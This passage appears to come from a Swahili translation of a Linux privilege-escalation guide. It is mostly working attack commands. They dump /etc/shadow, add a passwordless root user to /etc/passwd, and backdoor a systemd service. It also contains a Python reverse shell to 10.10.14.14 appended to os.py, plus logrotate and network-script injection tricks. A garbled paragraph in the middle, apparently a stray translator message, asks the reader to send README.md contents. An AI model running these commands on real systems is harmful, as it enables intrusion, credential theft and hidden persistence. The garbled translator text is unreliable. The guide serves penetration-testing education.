cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Katika baadhi ya matukio unaweza kupata **password hashes** ndani ya faili ya `/etc/passwd` (au faili sawa)
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Inayoweza kuandikwa /etc/passwd

Kwanza, tengeneza nywila kwa kutumia moja ya amri zifuatazo.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Ninaomba ufafanuzi/kopi ya yaliyomo ya src/linux-hardening/privilege-escalation/README.md (markdown) ili niweze kutafsiri na kuongezea mstari unaoonyesha kuongeza user `hacker` na nywila iliyotengenezwa.  
Unataka nipate nywila salama moja na kuiweka wazi ndani ya faili (plain text), au ungependelea tu kuonyesha amri za kuunda user na kuweka password bila kuandika nywila wazi?  

Tuma yaliyomo ya README.md hapa, na thibitisha chaguo la password.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Kwa mfano: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Sasa unaweza kutumia amri ya `su` ukitumia `hacker:hacker`

Mbali na hayo, unaweza kutumia mistari ifuatayo kuongeza mtumiaji wa kuigiza bila nenosiri.\
ONYO: unaweza kupunguza usalama wa sasa wa mashine.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
Kumbuka: Katika majukwaa ya BSD `/etc/passwd` iko katika `/etc/pwd.db` na `/etc/master.passwd`, pia `/etc/shadow` imebadilishwa jina kuwa `/etc/spwd.db`.

Unapaswa kuangalia ikiwa unaweza **kuandika kwenye baadhi ya faili nyeti**. Kwa mfano, je, unaweza kuandika kwenye baadhi ya **faili ya usanidi ya huduma**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Kwa mfano, ikiwa mashine inaendesha server ya **tomcat** na unaweza **modify the Tomcat service configuration file inside /etc/systemd/,** basi unaweza kubadilisha mistari:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Backdoor yako itaendeshwa mara ijayo tomcat itakapowashwa.

### Kagua Folda

Folda zifuatazo zinaweza kuwa na backups au taarifa za kuvutia: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Huenda huwezi kusoma ile ya mwisho, lakini jaribu)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Nafasi Isiyo ya Kawaida/Mafaili ya Owned
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Faili zilizobadilishwa katika dakika zilizopita
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB mafaili
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml mafayela
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Mafaili yaliyofichwa
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries katika PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Mafaili ya wavuti**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Chelezo**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Faili zilizojulikana zenye nywila

Soma msimbo wa [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), inatafuta **faili kadhaa zinazowezekana ambazo zinaweza kuwa na nywila**.\
**Zana nyingine ya kuvutia** ambayo unaweza kutumia kufanya hivyo ni: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) ambayo ni programu ya open source inayotumika kupata nywila nyingi zilizohifadhiwa kwenye kompyuta ya ndani kwa Windows, Linux & Mac.

### Logs

Ikiwa unaweza kusoma logs, unaweza kupata **taarifa za kuvutia/za siri ndani yake**. Kadri log inavyoonekana ya ajabu, ndivyo itakavyokuwa ya kuvutia zaidi (pengine).\
Pia, baadhi ya "**bad**" configured (backdoored?) **audit logs** zinaweza kukuwezesha **kurekodi nywila** ndani ya audit logs kama inavyoelezwa katika chapisho hili: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/].
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Ili kusoma logs, kikundi [**adm**](interesting-groups-linux-pe/index.html#adm-group) kitakuwa msaada mkubwa.

### Faili za Shell
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Unapaswa pia kuangalia faili zenye neno "**password**" katika **jina** au ndani ya **maudhui**, na pia angalia IPs na emails ndani ya logs, au hashes regexps.\
Sitaorodhesha hapa jinsi ya kufanya yote haya, lakini ikiwa una nia unaweza kuangalia ukaguzi wa mwisho ambao [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) hufanya.

## Writable files

### Python library hijacking

Ikiwa unajua kutoka **wapi** script ya python itaendeshwa na unaweza **kuandika ndani** ya folda hiyo au unaweza **kuhariri maktaba za python**, unaweza kubadilisha maktaba ya OS na kuiweka backdoor (kama unaweza kuandika mahali script ya python itaendeshwa, nakili na ubandike maktaba os.py).

Ili **backdoor the library** ongeza tu mwishoni mwa maktaba os.py mstari ufuatao (badilisha IP na PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

Udhaifu katika `logrotate` unawawezesha watumiaji wenye **write permissions** kwenye faili ya logi au saraka zake za juu kupata ruhusa za juu. Hii ni kwa sababu `logrotate`, mara nyingi ikifanya kazi kama **root**, inaweza kudanganywa ili kuendesha faili zozote, hasa katika saraka kama _**/etc/bash_completion.d/**_. Ni muhimu kukagua ruhusa sio tu katika _/var/log_ bali pia katika saraka yoyote ambapo log rotation inatumika.

> [!TIP]
> Udhaifu huu unaathiri `logrotate` version `3.18.0` and older

Maelezo zaidi kuhusu udhaifu yanaweza kupatikana kwenye ukurasa huu: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Unaweza kutumia udhaifu huu kwa kutumia [**logrotten**](https://github.com/whotwagner/logrotten).

Udhaifu huu ni sawa sana na [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** hivyo kila unapogundua unaweza kubadilisha logs, angalia nani anasimamia logs hizo na angalia kama unaweza kupata ruhusa za juu kwa kubadilisha logs kuwa symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Ikiwa, kwa sababu yoyote, mtumiaji anaweza kuandika script ya `ifcf-<whatever>` katika _/etc/sysconfig/network-scripts_ au kurekebisha ile iliyopo, basi **system yako is pwned**.

Network scripts, _ifcg-eth0_ kwa mfano hutumika kwa miunganisho ya mtandao. Zinatafutwa sawasawa na .INI files. Hata hivyo, zinakuwa ~sourced~ kwenye Linux na Network Manager (dispatcher.d).

Katika kesi yangu, thamani ya `NAME=` iliyowekwa katika scripts hizi za mtandao haiendeshwi ipasavyo. Ikiwa jina lina nafasi tupu/blank mfumo hujaribu kutekeleza sehemu iliyofuata nafasi hiyo. Hii ina maana kwamba **kila kitu kinachofuata nafasi ya kwanza kinatekelezwa kama root**.

Kwa mfano: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Kumbuka nafasi tupu kati ya Network na /bin/id_)

### **init, init.d, systemd, na rc.d**

The directory `/etc/init.d` is home to **scripts** for System V init (SysVinit), the **classic Linux service management system**. It includes scripts to `start`, `stop`, `restart`, and sometimes `reload` services. These can be executed directly or through symbolic links found in `/etc/rc?.d/`. An alternative path in Redhat systems is `/etc/rc.d/init.d`.

Kwa upande mwingine, `/etc/init` inahusishwa na **Upstart**, mfumo mpya wa **service management** uliotangazwa na Ubuntu, unaotumia mafaili ya configuration kwa shughuli za usimamizi wa service. Licha ya mabadiliko kuelekea Upstart, script za SysVinit bado zinatumika pamoja na configuration za Upstart kwa sababu ya safu ya ulinganifu ndani ya Upstart.

**systemd** emerges as a modern initialization and service manager, offering advanced features such as on-demand daemon starting, automount management, and system state snapshots. It organizes files into `/usr/lib/systemd/` for distribution packages and `/etc/systemd/system/` for administrator modifications, streamlining the system administration process.

## Mbinu Nyingine

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks commonly hook a syscall to expose privileged kernel functionality to a userspace manager. Weak manager authentication (e.g., signature checks based on FD-order or poor password schemes) can enable a local app to impersonate the manager and escalate to root on already-rooted devices. Jifunze zaidi na maelezo ya exploitation hapa:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex-driven service discovery in VMware Tools/Aria Operations can extract a binary path from process command lines and execute it with -v under a privileged context. Permissive patterns (e.g., using \S) may match attacker-staged listeners in writable locations (e.g., /tmp/httpd), leading to execution as root (CWE-426 Untrusted Search Path).

Jifunze zaidi na ona pattern jumla inayoweza kutumika kwa discovery/monitoring stacks nyingine hapa:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Ulinzi wa Usalama wa Kernel

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Msaada zaidi

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Zana bora ya kutafuta Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Marejeleo

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)


- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
